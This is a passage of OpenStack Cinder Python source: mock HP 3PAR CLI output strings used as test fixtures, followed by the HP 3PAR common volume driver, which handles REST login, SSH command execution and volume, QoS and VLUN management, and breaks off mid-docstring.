    '0:2:1,28210002AC00383D,20210002AC00383D\r\n'
    '0:2:2,2FF70002AC00383D,20220002AC00383D\r\n'
    '0:2:3,2FF70002AC00383D,20230002AC00383D\r\n'
    '0:2:4,2FF70002AC00383D,20240002AC00383D\r\n'
    '0:5:1,2FF70002AC00383D,20510002AC00383D\r\n'
    '0:5:2,2FF70002AC00383D,20520002AC00383D\r\n'
    '0:5:3,2FF70002AC00383D,20530002AC00383D\r\n'
    '0:5:4,2FF70202AC00383D,20540202AC00383D\r\n'
    '0:6:4,2FF70002AC00383D,20640002AC00383D\r\n'
    '0:8:1,10.10.120.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,0.0.0.0,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:2:1,29210002AC00383D,21210002AC00383D\r\n'
    '1:2:2,2FF70002AC00383D,21220002AC00383D\r\n'
    '-----------------------------------------------------------------\r\n')

VOLUME_STATE_RET = (
    'Id,Name,Prov,Type,State,-Detailed_State-\r\n'
    '410,volume-d03338a9-9115-48a3-8dfc-35cdfcdc15a7,snp,vcopy,normal,'
    'normal\r\n'
    '-----------------------------------------------------------------\r\n')

PORT_RET = (
    'N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,Protocol,'
    'Label,Partner,FailoverState\r\n'
    '0:2:1,target,ready,28210002AC00383D,20210002AC00383D,host,FC,'
    '-,1:2:1,none\r\n'
    '0:2:2,initiator,loss_sync,2FF70002AC00383D,20220002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:3,initiator,loss_sync,2FF70002AC00383D,20230002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:2:4,initiator,loss_sync,2FF70002AC00383D,20240002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:1,initiator,loss_sync,2FF70002AC00383D,20510002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:2,initiator,loss_sync,2FF70002AC00383D,20520002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:3,initiator,loss_sync,2FF70002AC00383D,20530002AC00383D,free,FC,'
    '-,-,-\r\n'
    '0:5:4,initiator,ready,2FF70202AC00383D,20540202AC00383D,host,FC,'
    '-,1:5:4,active\r\n'
    '0:6:1,initiator,ready,2FF70002AC00383D,20610002AC00383D,disk,FC,'
    '-,-,-\r\n'
    '0:6:2,initiator,ready,2FF70002AC00383D,20620002AC00383D,disk,FC,'
    '-,-,-\r\n')

ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,82,1500,n/a,0,0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,loss_sync,0.0.0.0,0.0.0.0,0.0.0.0,182,1500,n/a,0,0.0.0.0,3205\r\n')

ISCSI_3PAR_RET = (
    'Id,Name,Persona,-WWN/iSCSI_Name-,Port,IP_addr\r\n'
    '75,fakehost.foo,Generic,iqn.1993-08.org.debian:01:222,---,'
    '10.10.222.12\r\n'
    '\r\n'
    'Id,Name,-Initiator_CHAP_Name-,-Target_CHAP_Name-\r\n'
    '75,fakehost.foo,--,--\r\n'
    '\r\n'
    '---------- Host fakehost.foo ----------\r\n'
    'Name       : fakehost.foo\r\n'
    'Domain     : FAKE_TEST\r\n'
    'Id         : 75\r\n'
    'Location   : --\r\n'
    'IP Address : --\r\n'
    'OS         : --\r\n'
    'Model      : --\r\n'
    'Contact    : --\r\n'
    'Comment    : --  \r\n\r\n\r\n')

SHOW_PORT_ISCSI = (
    'N:S:P,IPAddr,---------------iSCSI_Name----------------\r\n'
    '0:8:1,1.1.1.2,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '0:8:2,10.10.120.252,iqn.2000-05.com.3pardata:20820002ac00383d\r\n'
    '1:8:1,10.10.220.253,iqn.2000-05.com.3pardata:21810002ac00383d\r\n'
    '1:8:2,10.10.220.252,iqn.2000-05.com.3pardata:21820002ac00383d\r\n'
    '-------------------------------------------------------------\r\n')

SHOW_VLUN = (
    'Lun,VVName,HostName,---------Host_WWN/iSCSI_Name----------,Port,Type,'
    'Status,ID\r\n'
    '0,a,fakehost,iqn.1993-08.org.debian:01:3a779e4abc22,1:8:1,matched set,'
    'active,0\r\n'
    '------------------------------------------------------------------------'
    '--------------\r\n')

SHOW_VLUN_NONE = (
    'Port\r\n0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:2:1\r\n1:8:1\r\n1:8:1\r\n1:8:1\r\n'
    '1:8:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n0:2:1\r\n'
    '0:2:1\r\n0:2:1\r\n1:8:1\r\n1:8:1\r\n0:2:1\r\n0:2:1\r\n1:2:1\r\n1:2:1\r\n'
    '1:2:1\r\n1:2:1\r\n1:8:1\r\n-----')

READY_ISCSI_PORT_RET = (
    'N:S:P,State,IPAddr,Netmask,Gateway,TPGT,MTU,Rate,DHCP,iSNS_Addr,'
    'iSNS_Port\r\n'
    '0:8:1,ready,10.10.120.253,255.255.224.0,0.0.0.0,81,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '0:8:2,ready,10.10.120.252,255.255.224.0,0.0.0.0,82,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '1:8:1,ready,10.10.220.253,255.255.224.0,0.0.0.0,181,1500,10Gbps,'
    '0,0.0.0.0,3205\r\n'
    '1:8:2,ready,10.10.220.252,255.255.224.0,0.0.0.0,182,1500,10Gbps,0,'
    '0.0.0.0,3205\r\n'
    '-------------------------------------------------------------------'
    '----------------------\r\n')
/n/n/ncinder/volume/drivers/san/hp/hp_3par_common.py/n/n# vim: tabstop=4 shiftwidth=4 softtabstop=4
#
#    (c) Copyright 2012-2013 Hewlett-Packard Development Company, L.P.
#    All Rights Reserved.
#
#    Copyright 2012 OpenStack LLC
#
#    Licensed under the Apache License, Version 2.0 (the ""License""); you may
#    not use this file except in compliance with the License. You may obtain
#    a copy of the License at
#
#         http://www.apache.org/licenses/LICENSE-2.0
#
#    Unless required by applicable law or agreed to in writing, software
#    distributed under the License is distributed on an ""AS IS"" BASIS, WITHOUT
#    WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
#    License for the specific language governing permissions and limitations
#    under the License.
#
""""""
Volume driver common utilities for HP 3PAR Storage array

The 3PAR drivers requires 3.1.2 MU2 firmware on the 3PAR array.

You will need to install the python hp3parclient.
sudo pip install hp3parclient

The drivers uses both the REST service and the SSH
command line to correctly operate.  Since the
ssh credentials and the REST credentials can be different
we need to have settings for both.

The drivers requires the use of the san_ip, san_login,
san_password settings for ssh connections into the 3PAR
array.   It also requires the setting of
hp3par_api_url, hp3par_username, hp3par_password
for credentials to talk to the REST service on the 3PAR
array.
""""""

import ast
import base64
import json
import paramiko
import pprint
from random import randint
import re
import time
import uuid

from eventlet import greenthread
from hp3parclient import client
from hp3parclient import exceptions as hpexceptions
from oslo.config import cfg

from cinder import context
from cinder import exception
from cinder.openstack.common import excutils
from cinder.openstack.common import log as logging
from cinder import utils
from cinder.volume import volume_types


LOG = logging.getLogger(__name__)

hp3par_opts = [
    cfg.StrOpt('hp3par_api_url',
               default='',
               help=""3PAR WSAPI Server Url like ""
                    ""https://<3par ip>:8080/api/v1""),
    cfg.StrOpt('hp3par_username',
               default='',
               help=""3PAR Super user username""),
    cfg.StrOpt('hp3par_password',
               default='',
               help=""3PAR Super user password"",
               secret=True),
    #TODO(kmartin): Remove hp3par_domain during I release.
    cfg.StrOpt('hp3par_domain',
               default=None,
               help=""This option is DEPRECATED and no longer used. ""
                    ""The 3par domain name to use.""),
    cfg.StrOpt('hp3par_cpg',
               default=""OpenStack"",
               help=""The CPG to use for volume creation""),
    cfg.StrOpt('hp3par_cpg_snap',
               default="""",
               help=""The CPG to use for Snapshots for volumes. ""
                    ""If empty hp3par_cpg will be used""),
    cfg.StrOpt('hp3par_snapshot_retention',
               default="""",
               help=""The time in hours to retain a snapshot.  ""
                    ""You can't delete it before this expires.""),
    cfg.StrOpt('hp3par_snapshot_expiration',
               default="""",
               help=""The time in hours when a snapshot expires ""
                    "" and is deleted.  This must be larger than expiration""),
    cfg.BoolOpt('hp3par_debug',
                default=False,
                help=""Enable HTTP debugging to 3PAR""),
    cfg.ListOpt('hp3par_iscsi_ips',
                default=[],
                help=""List of target iSCSI addresses to use."")
]


CONF = cfg.CONF
CONF.register_opts(hp3par_opts)


class HP3PARCommon(object):

    stats = {}

    # Valid values for volume type extra specs
    # The first value in the list is the default value
    valid_prov_values = ['thin', 'full']
    valid_persona_values = ['1 - Generic',
                            '2 - Generic-ALUA',
                            '6 - Generic-legacy',
                            '7 - HPUX-legacy',
                            '8 - AIX-legacy',
                            '9 - EGENERA',
                            '10 - ONTAP-legacy',
                            '11 - VMware',
                            '12 - OpenVMS']
    hp_qos_keys = ['maxIOPS', 'maxBWS']
    hp3par_valid_keys = ['cpg', 'snap_cpg', 'provisioning', 'persona', 'vvs']

    def __init__(self, config):
        self.sshpool = None
        self.config = config
        self.hosts_naming_dict = dict()
        self.client = None
        if CONF.hp3par_domain is not None:
            LOG.deprecated(_(""hp3par_domain has been deprecated and ""
                             ""is no longer used. The domain is automatically ""
                             ""looked up based on the CPG.""))

    def check_flags(self, options, required_flags):
        for flag in required_flags:
            if not getattr(options, flag, None):
                raise exception.InvalidInput(reason=_('%s is not set') % flag)

    def _create_client(self):
        return client.HP3ParClient(self.config.hp3par_api_url)

    def client_login(self):
        try:
            LOG.debug(""Connecting to 3PAR"")
            self.client.login(self.config.hp3par_username,
                              self.config.hp3par_password)
        except hpexceptions.HTTPUnauthorized as ex:
            LOG.warning(""Failed to connect to 3PAR (%s) because %s"" %
                       (self.config.hp3par_api_url, str(ex)))
            msg = _(""Login to 3PAR array invalid"")
            raise exception.InvalidInput(reason=msg)

    def client_logout(self):
        self.client.logout()
        LOG.debug(""Disconnect from 3PAR"")

    def do_setup(self, context):
        self.client = self._create_client()
        if self.config.hp3par_debug:
            self.client.debug_rest(True)

        self.client_login()

        try:
            # make sure the default CPG exists
            self.validate_cpg(self.config.hp3par_cpg)
            self._set_connections()
        finally:
            self.client_logout()

    def validate_cpg(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound as ex:
            err = (_(""CPG (%s) doesn't exist on array"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

    def _set_connections(self):
        """"""Set the number of concurrent connections.

        The 3PAR WS API server has a limit of concurrent connections.
        This is setting the number to the highest allowed, 15 connections.
        """"""
        self._cli_run(['setwsapi', '-sru', 'high'])

    def get_domain(self, cpg_name):
        try:
            cpg = self.client.getCPG(cpg_name)
        except hpexceptions.HTTPNotFound:
            err = (_(""Failed to get domain because CPG (%s) doesn't ""
                     ""exist on array."") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        domain = cpg['domain']
        if not domain:
            err = (_(""CPG (%s) must be in a domain"") % cpg_name)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)
        return domain

    def extend_volume(self, volume, new_size):
        volume_name = self._get_3par_vol_name(volume['id'])
        old_size = volume.size
        growth_size = int(new_size) - old_size
        LOG.debug(""Extending Volume %s from %s to %s, by %s GB."" %
                  (volume_name, old_size, new_size, growth_size))
        try:
            self._cli_run(['growvv', '-f', volume_name, '%dg' % growth_size])
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error extending volume %s"") % volume)

    def _get_3par_vol_name(self, volume_id):
        """"""Get converted 3PAR volume name.

        Converts the openstack volume id from
        ecffc30f-98cb-4cf5-85ee-d7309cc17cd2
        to
        osv-7P.DD5jLTPWF7tcwnMF80g

        We convert the 128 bits of the uuid into a 24character long
        base64 encoded string to ensure we don't exceed the maximum
        allowed 31 character name limit on 3Par

        We strip the padding '=' and replace + with .
        and / with -
        """"""
        volume_name = self._encode_name(volume_id)
        return ""osv-%s"" % volume_name

    def _get_3par_snap_name(self, snapshot_id):
        snapshot_name = self._encode_name(snapshot_id)
        return ""oss-%s"" % snapshot_name

    def _get_3par_vvs_name(self, volume_id):
        vvs_name = self._encode_name(volume_id)
        return ""vvs-%s"" % vvs_name

    def _encode_name(self, name):
        uuid_str = name.replace(""-"", """")
        vol_uuid = uuid.UUID('urn:uuid:%s' % uuid_str)
        vol_encoded = base64.b64encode(vol_uuid.bytes)

        # 3par doesn't allow +, nor /
        vol_encoded = vol_encoded.replace('+', '.')
        vol_encoded = vol_encoded.replace('/', '-')
        # strip off the == as 3par doesn't like those.
        vol_encoded = vol_encoded.replace('=', '')
        return vol_encoded

    def _capacity_from_size(self, vol_size):

        # because 3PAR volume sizes are in
        # Mebibytes, Gigibytes, not Megabytes.
        MB = 1000L
        MiB = 1.048576

        if int(vol_size) == 0:
            capacity = MB  # default: 1GB
        else:
            capacity = vol_size * MB

        capacity = int(round(capacity / MiB))
        return capacity

    def _cli_run(self, cmd):
        """"""Runs a CLI command over SSH, without doing any result parsing.""""""
        LOG.debug(""SSH CMD = %s "" % cmd)

        (stdout, stderr) = self._run_ssh(cmd, False)

        # we have to strip out the input and exit lines
        tmp = stdout.split(""\r\n"")
        out = tmp[5:len(tmp) - 2]
        return out

    def _ssh_execute(self, ssh, cmd, check_exit_code=True):
        """"""We have to do this in order to get CSV output from the CLI command.

        We first have to issue a command to tell the CLI that we want the
        output to be formatted in CSV, then we issue the real command.
        """"""
        LOG.debug(_('Running cmd (SSH): %s'), cmd)

        channel = ssh.invoke_shell()
        stdin_stream = channel.makefile('wb')
        stdout_stream = channel.makefile('rb')
        stderr_stream = channel.makefile('rb')

        stdin_stream.write('''setclienv csvtable 1
%s
exit
''' % cmd)

        # stdin.write('process_input would go here')
        # stdin.flush()

        # NOTE(justinsb): This seems suspicious...
        # ...other SSH clients have buffering issues with this approach
        stdout = stdout_stream.read()
        stderr = stderr_stream.read()
        stdin_stream.close()
        stdout_stream.close()
        stderr_stream.close()

        exit_status = channel.recv_exit_status()

        # exit_status == -1 if no exit code was returned
        if exit_status != -1:
            LOG.debug(_('Result was %s') % exit_status)
            if check_exit_code and exit_status != 0:
                raise exception.ProcessExecutionError(exit_code=exit_status,
                                                      stdout=stdout,
                                                      stderr=stderr,
                                                      cmd=cmd)
        channel.close()
        return (stdout, stderr)

    def _run_ssh(self, cmd_list, check_exit=True, attempts=1):
        utils.check_ssh_injection(cmd_list)
        command = ' '. join(cmd_list)

        if not self.sshpool:
            self.sshpool = utils.SSHPool(self.config.san_ip,
                                         self.config.san_ssh_port,
                                         self.config.ssh_conn_timeout,
                                         self.config.san_login,
                                         password=self.config.san_password,
                                         privatekey=
                                         self.config.san_private_key,
                                         min_size=
                                         self.config.ssh_min_pool_conn,
                                         max_size=
                                         self.config.ssh_max_pool_conn)
        try:
            total_attempts = attempts
            with self.sshpool.item() as ssh:
                while attempts > 0:
                    attempts -= 1
                    try:
                        return self._ssh_execute(ssh, command,
                                                 check_exit_code=check_exit)
                    except Exception as e:
                        LOG.error(e)
                        greenthread.sleep(randint(20, 500) / 100.0)
                msg = (_(""SSH Command failed after '%(total_attempts)r' ""
                         ""attempts : '%(command)s'"") %
                       {'total_attempts': total_attempts, 'command': command})
                raise paramiko.SSHException(msg)
        except Exception:
            with excutils.save_and_reraise_exception():
                LOG.error(_(""Error running ssh command: %s"") % command)

    def _delete_3par_host(self, hostname):
        self._cli_run(['removehost', hostname])

    def _create_3par_vlun(self, volume, hostname):
        out = self._cli_run(['createvlun', volume, 'auto', hostname])
        if out and len(out) > 1:
            if ""must be in the same domain"" in out[0]:
                err = out[0].strip()
                err = err + "" "" + out[1].strip()
                raise exception.Invalid3PARDomain(err=err)

    def _safe_hostname(self, hostname):
        """"""We have to use a safe hostname length for 3PAR host names.""""""
        try:
            index = hostname.index('.')
        except ValueError:
            # couldn't find it
            index = len(hostname)

        # we'll just chop this off for now.
        if index > 23:
            index = 23

        return hostname[:index]

    def _get_3par_host(self, hostname):
        out = self._cli_run(['showhost', '-verbose', hostname])
        LOG.debug(""OUTPUT = \n%s"" % (pprint.pformat(out)))
        host = {'id': None, 'name': None,
                'domain': None,
                'descriptors': {},
                'iSCSIPaths': [],
                'FCPaths': []}

        if out:
            err = out[0]
            if err == 'no hosts listed':
                msg = {'code': 'NON_EXISTENT_HOST',
                       'desc': ""HOST '%s' was not found"" % hostname}
                raise hpexceptions.HTTPNotFound(msg)

            # start parsing the lines after the header line
            for line in out[1:]:
                if line == '':
                    break
                tmp = line.split(',')
                paths = {}

                LOG.debug(""line = %s"" % (pprint.pformat(tmp)))
                host['id'] = tmp[0]
                host['name'] = tmp[1]

                portPos = tmp[4]
                LOG.debug(""portPos = %s"" % (pprint.pformat(portPos)))
                if portPos == '---':
                    portPos = None
                else:
                    port = portPos.split(':')
                    portPos = {'node': int(port[0]), 'slot': int(port[1]),
                               'cardPort': int(port[2])}

                paths['portPos'] = portPos

                # If FC entry
                if tmp[5] == 'n/a':
                    paths['wwn'] = tmp[3]
                    host['FCPaths'].append(paths)
                # else iSCSI entry
                else:
                    paths['name'] = tmp[3]
                    paths['ipAddr'] = tmp[5]
                    host['iSCSIPaths'].append(paths)

            # find the offset to the description stuff
            offset = 0
            for line in out:
                if line[:15] == '---------- Host':
                    break
                else:
                    offset += 1

            info = out[offset + 2]
            tmp = info.split(':')
            host['domain'] = tmp[1]

            info = out[offset + 4]
            tmp = info.split(':')
            host['descriptors']['location'] = tmp[1]

            info = out[offset + 5]
            tmp = info.split(':')
            host['descriptors']['ipAddr'] = tmp[1]

            info = out[offset + 6]
            tmp = info.split(':')
            host['descriptors']['os'] = tmp[1]

            info = out[offset + 7]
            tmp = info.split(':')
            host['descriptors']['model'] = tmp[1]

            info = out[offset + 8]
            tmp = info.split(':')
            host['descriptors']['contact'] = tmp[1]

            info = out[offset + 9]
            tmp = info.split(':')
            host['descriptors']['comment'] = tmp[1]

        return host

    def get_ports(self):
        # First get the active FC ports
        out = self._cli_run(['showport'])

        # strip out header
        # N:S:P,Mode,State,----Node_WWN----,-Port_WWN/HW_Addr-,Type,
        # Protocol,Label,Partner,FailoverState
        out = out[1:len(out) - 2]

        ports = {'FC': [], 'iSCSI': {}}
        for line in out:
            tmp = line.split(',')

            if tmp:
                if tmp[1] == 'target' and tmp[2] == 'ready':
                    if tmp[6] == 'FC':
                        ports['FC'].append(tmp[4])

        # now get the active iSCSI ports
        out = self._cli_run(['showport', '-iscsi'])

        # strip out header
        # N:S:P,State,IPAddr,Netmask,Gateway,
        # TPGT,MTU,Rate,DHCP,iSNS_Addr,iSNS_Port
        out = out[1:len(out) - 2]
        for line in out:
            tmp = line.split(',')

            if tmp and len(tmp) > 2:
                if tmp[1] == 'ready':
                    ports['iSCSI'][tmp[2]] = {}

        # now get the nsp and iqn
        result = self._cli_run(['showport', '-iscsiname'])
        if result:
            # first line is header
            # nsp, ip,iqn
            result = result[1:]
            for line in result:
                info = line.split("","")
                if info and len(info) > 2:
                    if info[1] in ports['iSCSI']:
                        nsp = info[0]
                        ip_addr = info[1]
                        iqn = info[2]
                        ports['iSCSI'][ip_addr] = {'nsp': nsp,
                                                   'iqn': iqn
                                                   }

        LOG.debug(""PORTS = %s"" % pprint.pformat(ports))
        return ports

    def get_volume_stats(self, refresh):
        if refresh:
            self._update_volume_stats()

        return self.stats

    def _update_volume_stats(self):
        # const to convert MiB to GB
        const = 0.0009765625

        # storage_protocol and volume_backend_name are
        # set in the child classes
        stats = {'driver_version': '1.0',
                 'free_capacity_gb': 'unknown',
                 'reserved_percentage': 0,
                 'storage_protocol': None,
                 'total_capacity_gb': 'unknown',
                 'QoS_support': True,
                 'vendor_name': 'Hewlett-Packard',
                 'volume_backend_name': None}

        try:
            cpg = self.client.getCPG(self.config.hp3par_cpg)
            if 'limitMiB' not in cpg['SDGrowth']:
                total_capacity = 'infinite'
                free_capacity = 'infinite'
            else:
                total_capacity = int(cpg['SDGrowth']['limitMiB'] * const)
                free_capacity = int((cpg['SDGrowth']['limitMiB'] -
                                    cpg['UsrUsage']['usedMiB']) * const)

            stats['total_capacity_gb'] = total_capacity
            stats['free_capacity_gb'] = free_capacity
        except hpexceptions.HTTPNotFound:
            err = (_(""CPG (%s) doesn't exist on array"")
                   % self.config.hp3par_cpg)
            LOG.error(err)
            raise exception.InvalidInput(reason=err)

        self.stats = stats

    def create_vlun(self, volume, host):
        """"""Create a VLUN.

        In order to export a volume on a 3PAR box, we have to create a VLUN.
        """"""
        volume_name = self._get_3par_vol_name(volume['id'])
        self._create_3par_vlun(volume_name, host['name'])
        return self.client.getVLUN(volume_name)

    def delete_vlun(self, volume, hostname):
        volume_name = self._get_3par_vol_name(volume['id'])
        vlun = self.client.getVLUN(volume_name)
        self.client.deleteVLUN(volume_name, vlun['lun'], hostname)
        self._delete_3par_host(hostname)

    def _get_volume_type(self, type_id):
        ctxt = context.get_admin_context()
        return volume_types.get_volume_type(ctxt, type_id)

    def _get_key_value(self, hp3par_keys, key, default=None):
        if hp3par_keys is not None and key in hp3par_keys:
            return hp3par_keys[key]
        else:
            return default

    def _get_qos_value(self, qos, key, default=None):
        if key in qos:
            return qos[key]
        else:
            return default

    def _get_qos_by_volume_type(self, volume_type):
        qos = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if 'qos:' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp_qos_keys:
                qos[key] = int(value)
        return qos

    def _get_keys_by_volume_type(self, volume_type):
        hp3par_keys = {}
        specs = volume_type.get('extra_specs')
        for key, value in specs.iteritems():
            if ':' in key:
                fields = key.split(':')
                key = fields[1]
            if key in self.hp3par_valid_keys:
                hp3par_keys[key] = value
        return hp3par_keys

    def _set_qos_rule(self, qos, vvs_name):
        max_io = self._get_qos_value(qos, 'maxIOPS')
        max_bw = self._get_qos_value(qos, 'maxBWS')
        cli_qos_string = """"
        if max_io is not None:
            cli_qos_string += ('-io %s ' % max_io)
        if max_bw is not None:
            cli_qos_string += ('-bw %sM ' % max_bw)
        self._cli_run(['setqos', '%svvset:%s' % (cli_qos_string, vvs_name)])

    def _add_volume_to_volume_set(self, volume, volume_name,
                                  cpg, vvs_name, qos):
        if vvs_name is not None:
            # Admin has set a volume set name to add the volume to
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])
        else:
            vvs_name = self._get_3par_vvs_name(volume['id'])
            domain = self.get_domain(cpg)
            self._cli_run(['createvvset', '-domain', domain, vvs_name])
            self._set_qos_rule(qos, vvs_name)
            self._cli_run(['createvvset', '-add', vvs_name, volume_name])

    def _remove_volume_set(self, vvs_name):
        # Must first clear the QoS rules before removing the volume set
        self._cli_run(['setqos', '-clear', 'vvset:%s' % (vvs_name)])
        self._cli_run(['removevvset', '-f', vvs_name])

    def _remove_volume_from_volume_set(self, volume_name, vvs_name):
        self._cli_run(['removevvset', '-f', vvs_name, volume_name])

    def get_cpg(self, volume, allowSnap=False):
        volume_name = self._get_3par_vol_name(volume['id'])
        vol = self.client.getVolume(volume_name)
        if 'userCPG' in vol:
            return vol['userCPG']
        elif allowSnap:
            return vol['snapCPG']
        return None

    def _get_3par_vol_comment(self, volume_name):
        vol = self.client.getVolume(volume_name)
        if 'comment' in vol:
            return vol['comment']
        return None

    def get_persona_type(self, volume, hp3par_keys=None):
        default_persona = self.valid_persona_values[0]
        type_id = volume.get('volume_type_id', None)
        volume_type = None
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            if hp3par_keys is None:
                hp3par_keys = self._get_keys_by_volume_type(volume_type)
        persona_value = self._get_key_value(hp3par_keys, 'persona',
                                            default_persona)
        if persona_value not in self.valid_persona_values:
            err = _(""Must specify a valid persona %(valid)s, ""
                    ""value '%(persona)s' is invalid."") % \
                   ({'valid': self.valid_persona_values,
                     'persona': persona_value})
            raise exception.InvalidInput(reason=err)
        # persona is set by the id so remove the text and return the id
        # i.e for persona '1 - Generic' returns 1
        persona_id = persona_value.split(' ')
        return persona_id[0]

    def get_volume_settings_from_type(self, volume):
        cpg = None
        snap_cpg = None
        volume_type = None
        vvs_name = None
        hp3par_keys = {}
        qos = {}
        type_id = volume.get('volume_type_id', None)
        if type_id is not None:
            volume_type = self._get_volume_type(type_id)
            hp3par_keys = self._get_keys_by_volume_type(volume_type)
            vvs_name = self._get_key_value(hp3par_keys, 'vvs')
            if vvs_name is None:
                qos = self._get_qos_by_volume_type(volume_type)

        cpg = self._get_key_value(hp3par_keys, 'cpg',
                                  self.config.hp3par_cpg)
        if cpg is not self.config.hp3par_cpg:
            # The cpg was specified in a volume type extra spec so it
            # needs to be validiated that it's in the correct domain.
            self.validate_cpg(cpg)
            # Also, look to see if the snap_cpg was specified in volume
            # type extra spec, if not use the extra spec cpg as the
            # default.
            snap_cpg = self._get_key_value(hp3par_keys, 'snap_cpg', cpg)
        else:
            # default snap_cpg to hp3par_cpg_snap if it's not specified
            # in the volume type extra specs.
            snap_cpg = self.config.hp3par_cpg_snap
            # if it's still not set or empty then set it to the cpg
            # specified in the cinder.conf file.
            if not self.config.hp3par_cpg_snap:
                snap_cpg = cpg

        # if provisioning is not set use thin
        default_prov = self.valid_prov_values[0]
        prov_value = self._get_key_value(hp3par_keys, 'provisioning',
                                         default_prov)
        # check for valid provisioning type
        if prov_value not in self.valid_prov_values:
            err = _(""Must specify a valid provisioning type %(valid)s, ""
                    ""value '%(prov)s' is invalid."") % \
                   ({'valid': self.valid_prov_values,
                     'prov': prov_value})
            raise exception.InvalidInput(reason=err)

        tpvv = True
        if prov_value == ""full"":
            tpvv = False

        # check for valid persona even if we don't use it until
        # attach time, this will give the end user notice that the
        # persona type is invalid at volume creation time
        self.get_persona_type(volume, hp3par_keys)

        return {'cpg': cpg, 'snap_cpg': snap_cpg,
                'vvs_name': vvs_name, 'qos': qos,
                'tpvv': tpvv, 'volume_type': volume_type}

    def create_volume(self, volume):
        LOG.debug(""CREATE VOLUME (%s : %s %s)"" %
                  (volume['display_name'], volume['name'],
                   self._get_3par_vol_name(volume['id'])))
        try:
            comments = {'volume_id': volume['id'],
                        'name': volume['name'],
                        'type': 'OpenStack'}

            name = volume.get('display_name', None)
            if name:
                comments['display_name'] = name

            # get the options supported by volume types
            type_info = self.get_volume_settings_from_type(volume)
            volume_type = type_info['volume_type']
            vvs_name = type_info['vvs_name']
            qos = type_info['qos']
            cpg = type_info['cpg']
            snap_cpg = type_info['snap_cpg']
            tpvv = type_info['tpvv']

            type_id = volume.get('volume_type_id', None)
            if type_id is not None:
                comments['volume_type_name'] = volume_type.get('name')
                comments['volume_type_id'] = type_id
                if vvs_name is not None:
                    comments['vvs'] = vvs_name
                else:
                    comments['qos'] = qos

            extras = {'comment': json.dumps(comments),
                      'snapCPG': snap_cpg,
                      'tpvv': tpvv}

            capacity = self._capacity_from_size(volume['size'])
            volume_name = self._get_3par_vol_name(volume['id'])
            self.client.createVolume(volume_name, cpg, capacity, extras)
            if qos or vvs_name is not None:
                try:
                    self._add_volume_to_volume_set(volume, volume_name,
                                                   cpg, vvs_name, qos)
                except Exception as ex:
                    # Delete the volume if unable to add it to the volume set
                    self.client.deleteVolume(volume_name)
                    LOG.error(str(ex))
                    raise exception.CinderException(ex.get_description())
        except hpexceptions.HTTPConflict:
            raise exception.Duplicate(_(""Volume (%s) already exists on array"")
                                      % volume_name)
        except hpexceptions.HTTPBadRequest as ex:
            LOG.error(str(ex))
            raise exception.Invalid(ex.get_description())
        except exception.InvalidInput as ex:
            LOG.error(str(ex))
            raise ex
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex.get_description())

    def _copy_volume(self, src_name, dest_name, cpg=None, snap_cpg=None,
                     tpvv=True):
        # Virtual volume sets are not supported with the -online option
        cmd = ['createvvcopy', '-p', src_name, '-online']
        if snap_cpg:
            cmd.extend(['-snp_cpg', snap_cpg])
        if tpvv:
            cmd.append('-tpvv')
        if cpg:
            cmd.append(cpg)
        cmd.append(dest_name)
        LOG.debug('Creating clone of a volume with %s' % cmd)
        self._cli_run(cmd)

    def get_next_word(self, s, search_string):
        """"""Return the next word.

        Search 's' for 'search_string', if found return the word preceding
        'search_string' from 's'.
        """"""
        word = re.search(search_string.strip(' ') + ' ([^ ]*)', s)
        return word.groups()[0].strip(' ')

    def _get_3par_vol_comment_value(self, vol_comment, key):
        comment_dict = dict(ast.literal_eval(vol_comment))
        if key in comment_dict:
            return comment_dict[key]
        return None

    def create_cloned_volume(self, volume, src_vref):
        try:
            orig_name = self._get_3par_vol_name(volume['source_volid'])
            vol_name = self._get_3par_vol_name(volume['id'])

            type_info = self.get_volume_settings_from_type(volume)

            # make the 3PAR copy the contents.
            # can't delete the original until the copy is done.
            self._copy_volume(orig_name, vol_name, cpg=type_info['cpg'],
                              snap_cpg=type_info['snap_cpg'],
                              tpvv=type_info['tpvv'])
            return None
        except hpexceptions.HTTPForbidden:
            raise exception.NotAuthorized()
        except hpexceptions.HTTPNotFound:
            raise exception.NotFound()
        except Exception as ex:
            LOG.error(str(ex))
            raise exception.CinderException(ex)

    def _get_vvset_from_3par(self, volume_name):
        """"""Get Virtual Volume Set from 3PAR.

        The only way to do this currently is to try and delete the volume
        to get the error message.

        NOTE(walter-boring): don't call this unless you know the volume is
